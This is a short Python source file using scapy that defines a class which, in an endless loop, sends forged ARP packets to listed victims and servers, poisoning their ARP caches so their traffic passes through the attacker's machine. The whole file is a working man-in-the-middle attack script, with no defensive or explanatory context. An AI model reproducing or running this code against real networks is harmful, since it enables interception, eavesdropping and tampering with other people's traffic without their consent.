from scapy.all import *

class doPoisoning():

    def __init__(self, interface, myMAC, victims, maliciousServers):
        self.interface = interface
        self.myMAC = myMAC
        self.victims = victims
        self.maliciousServers = maliciousServers

    def doPoisoning(self):
        while True:
            for victim in self.victims:
                for webServer in self.maliciousServers:
                    if (victim["ip"] != webServer["ip"]) and (victim["mac"] != webServer["mac"]):
                        arp_packet1 = Ether(src=self.myMAC) / ARP(psrc=webServer["ip"], hwsrc=self.myMAC, pdst=victim["ip"], hwdst=victim["mac"])
                        sendp(arp_packet1, iface=self.interface)
                        arp_packet2 = Ether(src=self.myMAC) / ARP(psrc=victim["ip"], hwsrc=self.myMAC, pdst=webServer["ip"], hwdst=webServer["mac"])
                        sendp(arp_packet2, iface=self.interface)
            time.sleep(20)
